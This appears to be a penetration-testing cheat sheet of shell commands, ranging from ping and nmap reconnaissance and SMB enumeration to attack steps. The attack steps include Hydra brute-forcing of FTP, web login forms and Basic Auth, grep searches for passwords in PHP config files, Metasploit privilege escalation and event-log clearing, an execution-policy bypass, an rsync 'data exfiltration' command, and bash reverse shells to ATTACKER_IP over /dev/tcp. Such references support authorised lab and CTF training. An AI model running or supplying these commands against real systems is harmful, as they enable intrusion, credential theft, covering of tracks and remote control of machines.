## Ping

```bash
# Linux or macOS
ping -c 10 MACHINE_IP

# Windows
ping -n 10 MACHINE_IP
```

## Treaceroute/Tracert

```bash
# Linux or macOS
traceroute MACHINE_IP

# Windows
tracert MACHINE_IP
```

## Telnet

```bash
telnet MACHINE_IP PORT_NUMBER
```

## FTP

```bash
ftp TARGET_IP TARGET_PORT

# Anonymous authentication: provide anonymous as username and any password

# Download files from FTP server
get FILENAME
```

## SSH

```bash
# Connect to a server using SSH, use -p if the port is not 22
ssh USER@TARGET_IP -p PORT
# Enter password when requested

# Download files from the server using SSH
scp USER@TARGET_IP:FILE_TO_DOWNLOAD OUT_DIRECTORY
# Enter password when requested

## Set correct SSH private key permissions
chmod 600 PRIVATE_KEY

# Log in with a private key
ssh -i PRIVATE_KEY_NAME USER@TARGET
```

## Netstat

```bash
netstat -tuln 127.0.0.1
```

## MySQL

```bash
# Local connection (no password)
mysql -u root

# Local connection with password
mysql -u username -p

# Connect to specific database
mysql -u username -p database_name

# Remote connection
mysql -u username -h target.com -P 3306 -p

# Connect and execute query
mysql -u username -p -e "SELECT @@version;"

# Connect without database selection
mysql -u username -h target.com -p --skip-database
```

## Netcat

```bash
# As client:
nc -nv MACHINE_IP PORT

# As server
nc -lvnp PORT
```

## Netstat

```bash
# Linux
netstat -antp

# Windows
netstat -ano
```

## tcpdump

```bash
# Start a tcpdump listener on your local machine
sudo tcpdump ip proto \\icmp -i INTERFACE
```

## nmap host discovery

```bash
# Do not perform ports scanning
nmap -sn -v -T4 MACHINE_IP

# ACK Ping scanning for common ports
nmap -sn -PS21,22,25,80,445,3389,8080 -T4 MACHINE_IP

#Adding UDP ports 
nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 MACHINE_IP
```

## nmap port discovery

```bash
# Fast scan:
nmap -Pn -F MACHINE_IP

# Scan of the most 1000 common ports using SYN scan and, running default scripts and using version discovery:
sudo nmap -sS -sV -sC MACHINE_IP

# Aggressive guess of the operating system:
sudo nmap -sS -sV -O --osscan-guess MACHINE_IP

# Get ports from an nmap scan file
grep '^[0-9]' nmap_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
```


## SMB

**nmap recon**

```bash
# List SMB protocols
nmap -p445 --script smb-protocols TARGET_IP

# List security level
nmap -p445 --script smb-security-mode TARGET_IP

# List users logged into the system
nmap -p445 --script smb-enum-sessions TARGET_IP

# List users logged into the system using valid credentials
nmap -p445 --script smb-enum-sessions --script-args smbusername=USERNAME,smbpassword=PASS TARGET_IP

# Enumerate all available shared folders
nmap -p445 --script smb-enum-shares TARGET_IP

# Enumerate all available shared folders and list files from directories
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=USERNAME,smbpassword=PASS TARGET_IP

# Enumerte Windows users on a target machine
nmap -p445 --script smb-enum-users --script-args smbusername=USERNAME,smbpassword=PASS TARGET_IP

# Get server statistics
nmap -p445 --script smb-server-stats --script-args smbusername=USERNAME,smbpassword=PASS TARGET_IP

```

**smbclient**

```bash
# Login
smbclient //TARGET_IP/SHARE_NAME -U USERNAME
# Enter password when requested

# Download file from SMB
get FILENAME

```


## Metasploit

```bash

# Module information
info

# Set global variable
setg VARIABLE_NAME VALUE

# Attempt to elevate your privilege to that of local system
getsystem 

# Attempt to enable all privileges available to the current process
getprivs

# Clear events
clearev
```

## Hydra

```bash
# Brute force FTP user
hydra -L USERS_LIST -P PASS_LIST ftp://TARGET_IP:PORT

# Brute force login form: hydra -l admin -P PASS_LIST TARGET_IP http-post-form -m "ENDPOINT:POST_BODY:INVALID_ALERT"  -t 64 -F 
hydra -L USERS_LIST -P PASS_LIST http-post-form://TARGET_IP -m "/login:username=^USER^&password=^PASS^&F=Invalid username or password=1:S=302" -t 64 -F 
# -F: stops when valid credentials are found

# Brute force BasicAuth
hydra -l USER_NAME -P /usr/share/wordlists/rockyou.txt -s PORT TARGET_IP http-get/
```

## PHP

Interesting Apache files to check: `phpinfo.php``

```bash
# Find the path for common PHP config files starting from /var/www/html
find /var/www/html -type f \( -name "wp-config.php" -o -name "config.php" -o -name "db.php" -o -name "database.php" -o -name "settings.php" -o -name "local.php" -o -name ".env" -o -name "constants.php" \) 2>/dev/null

# Search for passwords in common PHP config files
grep -ri "pass" /var/www/html --include={wp-config.php,config.php,db.php,database.php,settings.php,local.php,.env,constants.php} 2>/dev/null
```


## Run Server

```bash
# Python
python3 -m http.server -p 80

# PHP
php -S 0.0.0.0:8000
```

## Windows

```
# Download files
certutil -urlcache -f URL_TO_DOWNLOAD_FILE FILE_NAME

# Change password for administrator user
net user administrator NEW_PASS

# Bypass the default execution policy when running PowerShell scripts from the Windows command line
powershell -ep bypass .\script.ps1

# Run command as specific user
runas.exe /user:USER_NAME cmd

# Modify the Access Control List of a specific folder
icacls FOLDER /remove:d "NT AUTHORITY\SYSTEM"
```

## Linux

```bash
# Set a password for a specific user:
passwd USER_NAME

# List shells
cat /etc/shells

# Upgrading non-interactive shells with Python
python -c 'import pty; pty.spawn("/bin/bash")'

# Decompress GZIP files
gzip -d GZIP_FILE

# Compile and run C file with GCC
gcc FILE.c -o OUTPUT_FILE

# Compile and run C file with GCC
clang FILE.c -o OUTPUT_FILE

# Run compiled file
./OUTPUT_FILE
```

## rsync

```bash
# List modules
rsync target_host::

rsync -av --list-only rsync://target_host/module_name

# Data exfiltration
rsync -avz target_host::module_name /local/directory/
```


## Reverse Shell

```bash
/bin/bash -c "bash -i>& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"

# shell.sh
#!/bin/bash

bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

## Fully stable tty reverse shell

### Python pty module

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm-256color SHELL=bash
# Assign valid col and row value: stty -a | head -n 1
stty rows ROW_VAL columns COL_VALUE
```

### Without using Python

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo;fg
reset
xterm
export TERM=xterm SHELL=bash
# Assign valid col and row value: stty -a | head -n 1
stty rows ROW_VAL columns COL_VALUE
```

## exiftool

```bash
exiftool FILE_NAME
```

## fcrackzip

```bash
fcrackzip -u -D -p [wordlist] [ZIP file]
# -u : try to decompress the first file by calling unzip with the guessed password
# -D : select dictionary mode. 
# -p : use string as initial password/file
```